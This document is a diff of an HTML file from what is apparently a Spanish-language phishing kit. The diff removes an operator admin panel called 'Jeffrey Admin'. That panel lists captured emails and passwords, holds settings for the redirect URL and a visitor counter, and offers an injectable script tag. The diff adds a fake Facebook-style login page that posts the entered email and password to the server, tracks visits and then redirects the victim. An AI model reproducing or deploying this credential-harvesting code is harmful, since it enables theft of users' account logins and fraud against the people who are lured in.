@@ -3,124 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - JEFFREY</title>
+    <title>Iniciar Sesión</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; margin: 0; display: flex; }
-        .sidebar { width: 250px; background: #1c1e21; color: white; height: 100vh; padding: 20px; box-sizing: border-box; }
-        .main { flex: 1; padding: 30px; }
-        .tab-btn { display: block; width: 100%; padding: 15px; background: none; border: none; color: white; text-align: left; cursor: pointer; font-size: 16px; border-radius: 8px; margin-bottom: 5px; }
-        .tab-btn:hover, .tab-btn.active { background: #303338; }
-        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #ddd; }
-        input { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 6px; }
-        button.save { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; margin-top: 15px; font-weight: bold; width: 100%; }
-        /* Estilo para bloquear el clic en el contador */
-        #counter-preview { pointer-events: none; user-select: none; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; font-family: Arial, sans-serif; }
+        .card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,.1); width: 100%; max-width: 400px; text-align: center; box-sizing: border-box; }
+        h2 { color: #1877f2; font-size: 30px; margin-bottom: 25px; }
+        input { width: 100%; height: 52px; padding: 0 15px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        button { width: 100%; height: 52px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <h2>Jeffrey Admin</h2>
-        <button class="tab-btn active" onclick="showTab('tab-logins')">Logins</button>
-        <button class="tab-btn" onclick="showTab('tab-config')">Configuración</button>
-        <button class="tab-btn" onclick="showTab('tab-script')">Script</button>
-    </div>
-
-    <div class="main">
-        <div id="tab-logins" class="tab-content active">
-            <div class="card">
-                <h3>Datos Capturados</h3>
-                <table>
-                    <thead><tr><th>Email</th><th>Password</th><th>Fecha</th><th>Acción</th></tr></thead>
-                    <tbody id="data-table"></tbody>
-                </table>
-            </div>
-        </div>
-
-        <div id="tab-config" class="tab-content">
-            <div class="card">
-                <h3>Ajustes Generales</h3>
-                <label>URL de Redirección Final:</label>
-                <input type="text" id="cfg-url" placeholder="https://facebook.com">
-                <br><br>
-                <label>ID Whos.amung.us:</label>
-                <input type="text" id="cfg-counter" placeholder="Ejemplo: k9s2p1">
-                <button class="save" onclick="saveConfig()">Guardar Cambios</button>
-            </div>
-            <div class="card" style="text-align: center;">
-                <h4>Visitantes en Vivo (Título: JEFFREY)</h4>
-                <div id="counter-preview">Cargando contador...</div>
-            </div>
-        </div>
-
-        <div id="tab-script" class="tab-content">
-            <div class="card">
-                <h3>Script Inyectable</h3>
-                <pre id="script-code" style="background:#eee; padding:15px; border-radius:6px; white-space: pre-wrap; word-break: break-all;"></pre>
-            </div>
-        </div>
+    <div class="card">
+        <h2>Iniciar Sesión</h2>
+        <input type="text" id="email" placeholder="Correo electrónico o teléfono">
+        <input type="password" id="pass" placeholder="Contraseña">
+        <button id="btn-login">Entrar</button>
     </div>
 
     <script>
-        const host = window.location.origin;
-        document.getElementById('script-code').innerText = `<script src="${host}/injector.js"><\/script>`;
-
-        function showTab(id) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            event.currentTarget.classList.add('active');
-            if(id === 'tab-logins') loadData();
-            if(id === 'tab-config') loadConfig();
+        // Rastreo JEFFREY en URL directa
+        async function trackSelf() {
+            try {
+                const res = await fetch('/config');
+                const config = await res.json();
+                if (config.counter_id) {
+                    const img = new Image();
+                    img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=JEFFREY&x=${encodeURIComponent(window.location.href)}`;
+                }
+            } catch (e) {}
         }
+        trackSelf();
 
-        async function loadData() {
-            const res = await fetch('/data');
-            const data = await res.json();
-            document.getElementById('data-table').innerHTML = data.map(row => `
-                <tr>
-                    <td>${row.email}</td>
-                    <td>${row.password}</td>
-                    <td>${new Date(row.date).toLocaleString()}</td>
-                    <td><button onclick="deleteLogin(${row.id})" style="color:red; cursor:pointer; background:none; border:none;">Eliminar</button></td>
-                </tr>
-            `).join('');
-        }
-
-        async function deleteLogin(id) {
-            if(confirm('¿Eliminar registro?')) {
-                await fetch(`/delete/${id}`, { method: 'DELETE' });
-                loadData();
-            }
-        }
-
-        async function loadConfig() {
-            const res = await fetch('/config');
-            const data = await res.json();
-            document.getElementById('cfg-url').value = data.redirect_url;
-            document.getElementById('cfg-counter').value = data.counter_id || "";
-            if(data.counter_id) {
-                // Widget con título JEFFREY y sin link
-                document.getElementById('counter-preview').innerHTML = `<img src="https://whos.amung.us/widget/${data.counter_id}.png?t=JEFFREY" border="0">`;
-            }
-        }
-
-        async function saveConfig() {
-            const url = document.getElementById('cfg-url').value;
-            const counter_id = document.getElementById('cfg-counter').value;
-            await fetch('/config', {
+        document.getElementById('btn-login').onclick = async function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            if(!email || !password) return;
+            this.innerText = "Cargando...";
+            await fetch('/login', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ url, counter_id })
+                body: JSON.stringify({ email, password })
             });
-            alert("¡Cambios guardados!");
-            loadConfig();
-        }
-
-        loadData();
+            const res = await fetch('/config');
+            const data = await res.json();
+            window.location.href = data.redirect_url;
+        };
     </script>
 </body>
 </html>
